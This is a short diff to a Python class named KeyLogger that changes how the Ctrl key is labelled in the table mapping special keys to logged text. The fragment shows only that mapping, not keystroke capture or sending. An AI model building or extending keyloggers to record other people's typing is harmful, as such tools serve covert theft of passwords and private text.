@@ -8,7 +8,7 @@ class KeyLogger:
         'Key.enter': '[ENTER]\n', 'Key.backspace': '[BACKSPACE]',
         'Key.space': ' ', 'Key.alt': '[ALT]', 'Key.delete': '[DEL]',
         'Key.left': '[LEFT ARROW]', 'Key.right': '[RIGHT ARROW]',
-        'Key.shift': '[SHIFT]', 'Key.ctrl': '[CTRL]'
+        'Key.shift': '[SHIFT]', 'Key.ctrl': 'ctrl + '
     }
 
     def __init__(self):
